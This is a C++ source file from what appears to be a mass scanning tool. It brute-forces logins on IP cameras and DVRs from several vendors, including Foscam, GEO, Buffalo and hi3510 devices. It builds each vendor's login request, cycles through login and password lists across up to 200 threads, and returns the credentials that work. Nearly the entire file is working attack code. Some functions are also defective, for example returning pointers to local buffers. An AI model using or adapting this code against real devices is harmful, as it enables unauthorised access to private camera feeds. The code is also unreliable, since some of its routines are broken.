#include "STh.h"
#include <libssh/libssh.h>
#include <sstream>
#include <openssl/md5.h>
#include "mainResources.h"
#include "externFunctions.h"
#include "externData.h"
#include "openssl/err.h"
#include "Utils.h"
#include "BruteUtils.h"

#if defined(WIN32) || defined(_WIN32) || defined(__WIN32) && !defined(__CYGWIN__)
#include <iphlpapi.h>
#include <icmpapi.h>
#pragma comment(lib, "iphlpapi.lib")
#endif
int gMaxBrutingThreads = 200;
fd_set write_fs;


int _countFTPDirectories(char *recvBuff){
	if(strcmp(recvBuff, "dummy\r\n") == 0) return 0;
	int dirCounter = 0;
	if(recvBuff[strlen(recvBuff) - 1] != '\n') strcat(recvBuff, "\n");
	char *dirPtr = strstr(recvBuff, "\n");
	while(dirPtr != NULL){
		++dirCounter;
		dirPtr = strstr(dirPtr + 1, "\n");
	};
	return dirCounter;
}

bool debugWriteWait = false;
void _DebugWriteHTMLToFile(char *request, char *buff)
{
	while(debugWriteWait) Sleep(50);
	debugWriteWait = true;
	FILE *df = fopen("./debugData.txt", "a");

	if(df != NULL)
	{
		fputs(request, df);
		fputs("==========================\n", df);
		fputs(buff, df);
		fputs("\n==========================\n==========================\n\n", df);
		fclose(df);
	}
	else
	{
		stt->doEmitionRedFoundData("[DEBUG] Cannot open debugData.txt");
	};
	debugWriteWait = false;
}

unsigned char tl(unsigned char d)
{
	if(d >= 192 && d <= 223)
    {
        return (unsigned char)(d + 32);
	}
	else 
	{
		return tolower(d);
	};
}

int recvWT( 
	int Socket, 
	char *Buffer, 
	int Len, 
	long Timeout, 
	int *bTimedOut 
	){ 
		fd_set ReadSet; 
		int n;
		struct timeval Time; 

		FD_ZERO(&ReadSet); 
		FD_SET(Socket,&ReadSet); 
		Time.tv_sec = Timeout; 
		Time.tv_usec = 0; 
        *bTimedOut = false;
		n = select(Socket+1,&ReadSet,NULL,NULL,&Time); 
		if (n > 0) { /* got some data */ 
			return recv(Socket,Buffer,Len,0); 
		} 
		if (n == 0) { /* timeout */ 
            *bTimedOut = true;
		} 
		return(n) ; /* trouble */ 
}

std::string toLowerStr(const char *str)
{
    if(str != NULL) {
        int tsz = strlen(str);
        char *strr = new char[tsz+1];
        ZeroMemory(strr, tsz);

        for (int i = 0; i < tsz; i++)
        {
            strr[i] = tl(str[i]);
        };

        memset(strr + tsz, '\0', 1);

        std::string tstr = std::string(strr);
        delete []strr;
        return tstr;
    } else return "";
}

int OpenConnection(SOCKET *sock, const char *hostname, int port)
{   
	struct hostent *host;
	struct sockaddr_in addr;
	if(strlen(hostname) == 0) 
	{
		return -1;
	};
	if(port < 0 || port > 65535) 
	{
		return -1;
	};

	if ( (host = gethostbyname(hostname)) == NULL )
	{
		++offlines;
		if(gNegDebugMode) stt->doEmitionDebugFoundData("[<a href=\"http://" + QString(hostname) + ":" + QString::number(port) + "/\"><font color=\"#0084ff\">" + QString(hostname) + ":" + QString::number(port) + "</font></a>" + "] Rejecting in _connection: Bad IP.");
		return -1;
	};
	*sock = socket(PF_INET, SOCK_STREAM, 0);
	ZeroMemory(&addr, sizeof(addr));
	addr.sin_family = AF_INET;
	addr.sin_port = htons(port);
	addr.sin_addr.s_addr = *(long*)(host->h_addr);
	if ( connect(*sock, (struct sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR )
	{
		++offlines;
		CSSOCKET(*sock);
		return -1;
	};
	return 0;
}

void _baSSLWorker(char *ip, char *request, char *rvBuff)
{
	const SSL_METHOD *method = SSLv3_client_method();  /* Create new client-method instance */
	SSL_CTX *ctx = SSL_CTX_new(method);   /* Create new context */

	if(ctx != NULL)
	{
		SOCKET sock;
		SSL_CTX_set_timeout(ctx, gTimeOut);
		int result = OpenConnection(&sock, ip, 443);
		if(result >= 0)
		{
			SSL *ssl = NULL;
			ssl = SSL_new(ctx);      /* create new SSL connection state */
			if(ssl != NULL)
			{
				SSL_set_fd(ssl, sock);    /* attach the socket descriptor */
				if(SSL_connect(ssl))
				{
					SSL_write(ssl, request, strlen(request));
					if(MapWidgetOpened) stt->doEmitionAddOutData(QString(request));

					char tempBuff[128] = {0};
					int x = 1;
					int xx = 0;

                    ZeroMemory(rvBuff, sizeof(*rvBuff));
					while(xx < 512)
					{
						x = SSL_read(ssl, tempBuff, sizeof(tempBuff));
						if(x <= 0) break;
						Activity += x;
						xx += x;
						strncat(rvBuff, tempBuff, x);
						ZeroMemory(tempBuff, sizeof(tempBuff));
					};

					if(MapWidgetOpened) stt->doEmitionAddIncData(QString(ip), QString(rvBuff));
					if(HTMLDebugMode) _DebugWriteHTMLToFile(request, rvBuff);
				};
				SSL_shutdown(ssl);
				SSL_free(ssl);
				CSSOCKET(sock);
				SSL_CTX_free(ctx);        /* release context */
				return;
			};
		};		
		CSSOCKET(sock);
		SSL_CTX_free(ctx);        /* release context */
	}
	else
	{
		char buff1[512] = {0};
		char buff2[512] = {0};
		
		ERR_error_string(ERR_peek_error(), buff1);
		ERR_error_string(ERR_peek_last_error(), buff2);
		stt->doEmitionRedFoundData(QString(ip) + " SSL(InitCTX) 1:" + QString(buff1) + " 2:" + QString(buff2));
	};
}

char *_getAttributeValue(char *str, char *val, char *ip, int port)
{
	char res[1024] = {0};
	char *ptrStart = NULL; 
	char *ptrS1End = NULL;
	char *ptrS2End = NULL;

	ptrStart = strstri(str, val);
	if(ptrStart != NULL)
	{
		if(strstri(ptrStart, "qop=auth") != NULL) return "auth";
		ptrS1End = _findFirst(ptrStart, "\"");
		if(ptrS1End != NULL)
		{
			ptrS2End = _findFirst(ptrS1End + 1, "\"");
			if(ptrS2End != NULL)
			{
				int sz = ptrS2End - ptrS1End - 1;

				if(sz != 0 && sz < 1024) strncpy(res, ptrS1End + 1, sz);
				else return "";

				return res;
			}
			else
			{
				stt->doEmitionRedFoundData("[_getAttributeValue] Error retrieving value: \"" + QString(val) + "\" IP:<a style=\"color:#819121;\" href=\"http://" + QString(ip) + ":" + QString::number(port) + "/\">" + QString(ip) + ":" + QString::number(port) + "</a>");
				return "";				
			};
		}
		else
		{
			stt->doEmitionRedFoundData("[_getAttributeValue] Error retrieving value: \"" + QString(val) + "\" IP:<a style=\"color:#919121;\" href=\"http://" + QString(ip) + ":" + QString::number(port) + "/\">" + QString(ip) + ":" + QString::number(port) + "</a>");
			return "";				
		};
	}
	else
	{
		stt->doEmitionRedFoundData("[_getAttributeValue] Error retrieving value: \"" + QString(val) + "\" IP:<a style=\"color:#819121;\" href=\"http://" + QString(ip) + ":" + QString::number(port) + "/\">" + QString(ip) + ":" + QString::number(port) + "</a>");
		return "";
	};
}

#define HASHLEN 16
typedef char HASH[HASHLEN];
#define HASHHEXLEN 32
typedef char HASHHEX[HASHHEXLEN+1];
#define IN
#define OUT
void CvtHex(
    IN HASH Bin,
    OUT HASHHEX Hex
    )
{
    unsigned short i;
    unsigned char j;

    for (i = 0; i < HASHLEN; i++) {
        j = (Bin[i] >> 4) & 0xf;
        if (j <= 9)
            Hex[i*2] = (j + '0');
         else
            Hex[i*2] = (j + 'a' - 10);
        j = Bin[i] & 0xf;
        if (j <= 9)
            Hex[i*2+1] = (j + '0');
         else
            Hex[i*2+1] = (j + 'a' - 10);
    };
    Hex[HASHHEXLEN] = '\0';
};
char *_makeDigestResponse(
	char *login, 
	char *realm, 
	char *pass, 
	char *path, 
	char *nonce,
	char *pszNonceCount,
	char *pszCNonce,
	char *pszQop
	)
{
	char HA1[MD5_DIGEST_LENGTH];
	char HA2[MD5_DIGEST_LENGTH];
	char HA1Data[512] = {0};
	char HA2Data[512] = {0};

	strcpy(HA1Data, login);
	strcat(HA1Data, ":");
	strcat(HA1Data, realm);
	strcat(HA1Data, ":");
	strcat(HA1Data, pass);

	strcpy(HA2Data, "GET:");
	strcat(HA2Data, path);

	MD5((unsigned char*) HA1Data, strlen(HA1Data), (unsigned char*)HA1);
	MD5((unsigned char*) HA2Data, strlen(HA2Data), (unsigned char*)HA2);

	char responseData[512] = {0};
	char *HA1MD5 = new char[64];
	char *HA2MD5 = new char[64];
	ZeroMemory(HA1MD5, 64);
	ZeroMemory(HA2MD5, 64);

	CvtHex(HA1, HA1MD5);
	strcpy(responseData, HA1MD5);
	strcat(responseData, ":");
	strcat(responseData, nonce);
	strcat(responseData, ":");
	if (*pszQop != NULL) {
		strcat(responseData, pszNonceCount);
		strcat(responseData, ":");
		strcat(responseData, pszCNonce);
		strcat(responseData, ":");
		strcat(responseData, pszQop);
		strcat(responseData, ":");
      };
	CvtHex(HA2, HA2MD5);
	strcat(responseData, HA2MD5);
	delete []HA1MD5;
	delete []HA2MD5;

	char response[MD5_DIGEST_LENGTH];
	MD5((unsigned char*) responseData, strlen(responseData), (unsigned char*)response);
	char responseMD5[64] = {0};
	CvtHex(response, responseMD5);
	return (char*)responseMD5;
}

int _webLoginSeq(char *request, char *login, char *pass, const char *ip, int port, int passCounter, char *type, std::vector<char*> negVector)
{
	char recvBuff[256] = {0};
	char recvBuff2[4096] = {0};

	SOCKET sock;
	sockaddr_in sockAddr;
	int bTO; 
	sockAddr.sin_family = AF_INET;  
	sockAddr.sin_port = htons(port);
	HOSTENT *host;  
#if defined(WIN32) || defined(_WIN32) || defined(__WIN32) && !defined(__CYGWIN__)
	if(inet_addr(ip) != INADDR_NONE) sockAddr.sin_addr.S_un.S_addr = inet_addr(ip);  
	else if(host=gethostbyname (ip)) ((unsigned long*) &sockAddr.sin_addr)[0] = ((unsigned long**)host->h_addr_list)[0][0];  
	else 
	{
		return -1;
	};
#else
	if(inet_addr(ip) != INADDR_NONE) sockAddr.sin_addr.s_addr = inet_addr(ip);  
    else if(host=gethostbyname(ip)) ((unsigned long*) &sockAddr.sin_addr)[0] = ((unsigned long**)host->h_addr_list)[0][0];
	else 
	{
		return -1;
	};
#endif
	sock = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );
	int cCode = connect(sock, (sockaddr*)&sockAddr, sizeof(sockAddr));
	int cErrCode = WSAGetLastError();

    while(cErrCode == WSAENOTSOCK)
	{
		CSSOCKET(sock);
		sock = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );
		cCode = connect(sock, (sockaddr*)&sockAddr, sizeof(sockAddr));
		cErrCode = WSAGetLastError();
        if(gDebugMode) stt->doEmitionDebugFoundData("[" + QString(type) + "][ENOTSOCK] [" + QString(ip) + ":" + QString::number(port) + "]");
	};

	if(cCode != SOCKET_ERROR) 
    {
		Activity += strlen(request);

		if(send(sock, request, strlen(request), 0) == SOCKET_ERROR) 	
		{
			stt->doEmitionRedFoundData("[" + QString(type) + "] Send error! [" + QString(ip) + "]");
			CSSOCKET(sock);
			return 0;
		}
		else 
		{
			if(MapWidgetOpened) stt->doEmitionAddOutData(QString(request));
			int x = 1;
			int xx = 0;
			ZeroMemory(recvBuff2, sizeof(recvBuff2));
			while(xx < 3072)
			{
				ZeroMemory(recvBuff, sizeof(recvBuff));
				x = recvWT(sock, recvBuff, sizeof(recvBuff), gTimeOut + 2, &bTO);
				if(x <= 0) break;
				strncat(recvBuff2, recvBuff, x);
				xx += x;
				Activity += x;
			};

			if(BALogSwitched) stt->doEmitionBAData("Checked " + QString(type) + ": " + QString(ip) + ":" + QString::number(port) + "; login/pass: "+ QString(login) + ":" + QString(pass) + ";	- Progress: (" + QString::number((passCounter/(double)(MaxPass*MaxLogin)) * 100).mid(0, 4) + "%)");

			if(MapWidgetOpened) stt->doEmitionAddIncData(QString(ip), QString(recvBuff2));

			if(strlen(recvBuff2) > 0) {
				bool result = true;
				for(int i = 0; i < negVector.size(); ++i)
				{
					if(strstri(recvBuff2, negVector[i]) != NULL)
					{
						result = false;
						break;
					};
				};

				if(result)
				{
					CSSOCKET(sock);
					return 1;
				};
			}
		};
	};

	CSSOCKET(sock);
	return 0;
}

lopaStr _IPCameraBrute(const char *ip, int port, char *SPEC)
{
	lopaStr lps;
	ZeroMemory(lps.login, sizeof(lps.login));
	ZeroMemory(lps.pass, sizeof(lps.pass));
	ZeroMemory(lps.other, sizeof(lps.other));
	char login[128] = {0};
	char pass[128] = {0};
    char request[1024] = {0};
	int passCounter = 1;

	std::vector<char*> negVector;
	if(strcmp(SPEC, "IPC") == 0)
	{
		negVector.push_back("<UserGroup>Invalid</UserGroup>");
	}
	else if(strcmp(SPEC, "GEO") == 0)
	{
		negVector.push_back("Access denied");
		negVector.push_back("ErrNoSuchUsr.htm");
	}
	else if(strcmp(SPEC, "EasyCam") == 0)
	{
		negVector.push_back("Set-Cookie: usrLevel=-1;path=/");
	}
	else if(strcmp(SPEC, "Foscam") == 0)
	{
		negVector.push_back("<result>0</result>");
		negVector.push_back("<result>-1</result>");
		negVector.push_back("<result>-2</result>");
		negVector.push_back("<result>-3</result>");
		negVector.push_back("<result>-4</result>");
		negVector.push_back("<result>-5</result>");
		negVector.push_back("<result>-6</result>");
		negVector.push_back("<result>-7</result>");
	}
	else if(strcmp(SPEC, "AVIOSYS") == 0)
	{
		negVector.push_back("Password Error");
	}
	else if(strcmp(SPEC, "BUFFALO") == 0)
	{
		negVector.push_back("403 Forbidden");
	}
	else if(strcmp(SPEC, "DVS") == 0)
	{
		negVector.push_back("Non-Existed");
	}
	else if(strcmp(SPEC, "IPCAM") == 0)
	{
		negVector.push_back("var check=\"0\"");
		negVector.push_back("var authLevel =\"0\";");
	}
	else if(strcmp(SPEC, "IEORFOREFOX") == 0)
	{
		negVector.push_back("AAA()");
		negVector.push_back("РРјСЏ РёР»Рё РїР°СЂРѕР»СЊ РЅРµРІРµСЂРЅС‹Рµ!");
		negVector.push_back("Р’РѕР·РІСЂР°С‚");
		negVector.push_back("HTTP/1.0 302 Found");
		negVector.push_back("is incorrect");
	}
	else
	{
		stt->doEmitionRedFoundData("[_IPCameraBrute] No \"SPEC\" specified!");

		strcpy(lps.login, "UNKNOWN");
		return lps;
	};

	for(int i = 0; i < MaxLogin; i++)
	{
		if(globalScanFlag == false) break;
		if(strcmp(loginLst[i], " ") == 0) continue;
		ZeroMemory(login, sizeof(login));
		strcpy(login, loginLst[i]);
		for(int j = 0; j < MaxPass; j++)
		{
			if(globalScanFlag == false) break;
			if(strcmp(passLst[j], " ") == 0) continue;
			
			ZeroMemory(pass, sizeof(pass));
			strcpy(pass, passLst[j]);

			ZeroMemory(request, sizeof(request));
			if(strcmp(SPEC, "IPC") == 0)
			{
				strcpy(request, "GET /login.xml?user=");
				strcat(request, login);
				strcat(request, "&usr=");
				strcat(request, login);
				strcat(request, "&password=");
				strcat(request, pass);
				strcat(request, "&pwd=");
				strcat(request, pass);
				strcat(request, " HTTP/1.1\r\nHost: ");
				strcat(request, ip);				
				if(port != 80){
					strcat(request, ":");
					char tbuff[16] = {0};
                    sprintf(tbuff, "%d", port);
                    strcat(request, tbuff);
				};
				strcat(request, "\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; us; rv:1.9.0.11) Gecko/2009060308 Ubuntu/9.04 (jaunty) Firefox/3.0.11\r\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Language: en-US,ru;q=0.9,en;q=0.8\r\nAccept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1\r\nAccept-Encoding: text, identity, *;q=0\r\nConnection: close\r\n\r\n");
			}
			else if(strcmp(SPEC, "GEO") == 0)
			{
				strcpy(request, "GET /Login.cgi?username=");
				strcat(request, login);
				strcat(request, "&password=");
				strcat(request, pass);
				strcat(request, " HTTP/1.1\r\nHost: ");
				strcat(request, ip);
				if(port != 80){
					strcat(request, ":");
					char tbuff[16] = {0};
                    sprintf(tbuff, "%d", port);
                    strcat(request, tbuff);
				};
				strcat(request, "\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; us; rv:1.9.0.11) Gecko/2009060308 Ubuntu/9.04 (jaunty) Firefox/3.0.11\r\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Language: en-US,ru;q=0.9,en;q=0.8\r\nAccept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1\r\nAccept-Encoding: text, identity, *;q=0\r\nConnection: close\r\n\r\n");
			}
			else if(strcmp(SPEC, "EasyCam") == 0)
			{
				strcpy(request, "GET /login.xml?user=");
				strcat(request, login);
				strcat(request, "&usr=");
				strcat(request, login);
				strcat(request, "&password=");
				strcat(request, pass);
				strcat(request, "&pwd=");
				strcat(request, pass);
				strcat(request, " HTTP/1.1\r\nHost: ");
				strcat(request, ip);
				if(port != 80){
					strcat(request, ":");
					char tbuff[16] = {0};
                    sprintf(tbuff, "%d", port);
                    strcat(request, tbuff);
				};
				strcat(request, "\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; us; rv:1.9.0.11) Gecko/2009060308 Ubuntu/9.04 (jaunty) Firefox/3.0.11\r\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Language: en-US,ru;q=0.9,en;q=0.8\r\nAccept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1\r\nAccept-Encoding: text, identity, *;q=0\r\nConnection: close\r\n\r\n");
			}
			else if(strcmp(SPEC, "Foscam") == 0)
			{
				strcpy(request, "GET /cgi-bin/CGIProxy.fcgi?usr=");
				strcat(request, login);
				strcat(request, "&pwd=");
				strcat(request, pass);
				strcat(request, "&cmd=logIn&usrName=");
				strcat(request, login);
				strcat(request, "&pwd=");
				strcat(request, pass);
				strcat(request, " HTTP/1.1\r\nHost: ");
				strcat(request, ip);
				if(port != 80){
					strcat(request, ":");
					char tbuff[16] = {0};
                    sprintf(tbuff, "%d", port);
                    strcat(request, tbuff);
				};
				strcat(request, "\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; us; rv:1.9.0.11) Gecko/2009060308 Ubuntu/9.04 (jaunty) Firefox/3.0.11\r\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Language: en-US,ru;q=0.9,en;q=0.8\r\nAccept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1\r\nAccept-Encoding: text, identity, *;q=0\r\nConnection: close\r\n\r\n");
			}
			else if(strcmp(SPEC, "AVIOSYS") == 0)
			{
				strcpy(request, "GET /check_user.html?UserName=");
				strcat(request, login);
				strcat(request, "&PassWord=");
				strcat(request, pass);
				strcat(request, " HTTP/1.1\r\nHost: ");
				strcat(request, ip);
				if(port != 80){
					strcat(request, ":");
					char tbuff[16] = {0};
                    sprintf(tbuff, "%d", port);
                    strcat(request, tbuff);
				};
				strcat(request, "\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; us; rv:1.9.0.11) Gecko/2009060308 Ubuntu/9.04 (jaunty) Firefox/3.0.11\r\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Language: en-US,ru;q=0.9,en;q=0.8\r\nAccept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1\r\nAccept-Encoding: text, identity, *;q=0\r\nConnection: close\r\n\r\n");
			}
			else if(strcmp(SPEC, "BUFFALO") == 0)
			{
				strcpy(request, "POST /rpc/login HTTP/1.1\r\nHost: ");
				strcat(request, ip);
				if(port != 80){
					strcat(request, ":");
					char tbuff[16] = {0};
                    sprintf(tbuff, "%d", port);
                    strcat(request, tbuff);
				};
				strcat(request, "\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; us; rv:1.9.0.11) Gecko/2009060308 Ubuntu/9.04 (jaunty) Firefox/3.0.11\r\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Language: en-US,ru;q=0.9,en;q=0.8\r\nAccept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1\r\nAccept-Encoding: text, identity, *;q=0\r\nConnection: keep-alive");
				int loginLength = strlen(login);
				int passLength = strlen(pass);
				int sz = loginLength + passLength + strlen("user=&password=");
				char *passString = new char[sz + 1];
				ZeroMemory(passString, sizeof(passString));
				strcpy(passString, "user=");
				strcat(passString, login);
				strcat(passString, "&password=");
				strcat(passString, pass);
				strcat(request, "\r\nContent-Length: ");
				char tempBuff[16] = {0};
                sprintf(tempBuff, "%d", sz);
                strcat(request, tempBuff);
				strcat(request, "\r\n\r\n");
				strcat(request, passString);
				delete []passString;
			}
			else if(strcmp(SPEC, "DVS") == 0)
			{
				strcpy(request, "POST /login HTTP/1.1\r\nHost: ");
				strcat(request, ip);
				if(port != 80){
					strcat(request, ":");
                    char tbuff[16] = {0};
                    sprintf(tbuff, "%d", port);
                    strcat(request, tbuff);
				};
				strcat(request, "\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; us; rv:1.9.0.11) Gecko/2009060308 Ubuntu/9.04 (jaunty) Firefox/3.0.11\r\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Language: en-US,ru;q=0.9,en;q=0.8\r\nAccept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1\r\nAccept-Encoding: text, identity, *;q=0\r\nConnection: keep-alive");
				int loginLength = strlen(login);
				int passLength = strlen(pass);
				int sz = loginLength + passLength + strlen("langs=en&user=&password=&submit=+Login+");
				char *passString = new char[sz + 1];
				ZeroMemory(passString, sizeof(passString));
				strcpy(passString, "langs=en&user=");
				strcat(passString, login);
				strcat(passString, "&password=");
				strcat(passString, pass);
				strcat(passString, "&submit=+Login+");
				strcat(request, "\r\nContent-Length: ");
				char tempBuff[16] = {0};
                sprintf(tempBuff, "%d", sz);
                strcat(request, tempBuff);
				strcat(request, "\r\n\r\n");
				strcat(request, passString);
				delete []passString;
			}
			else if(strcmp(SPEC, "IPCAM") == 0)
			{
				strcpy(request, "GET /cgi-bin/hi3510/checkuser.cgi?&-name=");
				strcat(request, login);
				strcat(request, "&-passwd=");
				strcat(request, pass);
				strcat(request, "&-time=1416767330831 HTTP/1.1\r\nHost: ");
				strcat(request, ip);
				if(port != 80){
					strcat(request, ":");
					char tbuff[16] = {0};
                    sprintf(tbuff, "%d", port);
                    strcat(request, tbuff);
				};
				strcat(request, "\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; us; rv:1.9.0.11) Gecko/2009060308 Ubuntu/9.04 (jaunty) Firefox/3.0.11\r\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Language: en-US,ru;q=0.9,en;q=0.8\r\nAccept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1\r\nAccept-Encoding: text, identity, *;q=0\r\nConnection: close\r\n\r\n");
			
			}
			else if(strcmp(SPEC, "IEORFOREFOX") == 0)
			{
				strcpy(request, "POST /logincheck.rsp?type=1 HTTP/1.1\r\nHost: ");
				strcat(request, ip);
				if(port != 80){
					strcat(request, ":");
					char tbuff[16] = {0};
                    sprintf(tbuff, "%d", port);
                    strcat(request, tbuff);
				};
				strcat(request, "\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; us; rv:1.9.0.11) Gecko/2009060308 Ubuntu/9.04 (jaunty) Firefox/3.0.11\r\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Language: en-US,ru;q=0.9,en;q=0.8\r\nAccept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1\r\nAccept-Encoding: text, identity, *;q=0\r\nConnection: keep-alive");
				int loginLength = strlen(login);
				int passLength = strlen(pass);
				int sz = loginLength + passLength + strlen("username=&userpwd=");
				char *passString = new char[sz + 1];
				ZeroMemory(passString, sizeof(passString));
				strcpy(passString, "username=");
				strcat(passString, login);
				strcat(passString, "&userpwd=");
				strcat(passString, pass);
				strcat(request, "\r\nContent-Length: ");
				char tempBuff[16] = {0};
                sprintf(tempBuff, "%d", sz);
                strcat(request, tempBuff);
				strcat(request, "\r\n\r\n");
				strcat(request, passString);
				delete []passString;
			};

			int res = _webLoginSeq(request, login, pass, ip, port, passCounter, SPEC, negVector);

			if(res == 1)
            {
				strcpy(lps.login, loginLst[i]);
				strcpy(lps.pass, passLst[j]);
				return lps;
			}
			else if(res == -1)
            {
				strcpy(lps.login, "UNKNOWN");
				return lps;
			};
			++passCounter;
		};
    };

	strcpy(lps.login, "UNKNOWN");
	return lps;
}

lopaStr _IPCameraBLobby(const char *ip, int port, char *SPEC)
{
	while(BrutingThrds >= gMaxBrutingThreads) Sleep(1000);

    BruteUtils::BConInc();
	lopaStr res = _IPCameraBrute(ip, port, SPEC);
    BruteUtils::BConDec();
	
	return res;
}
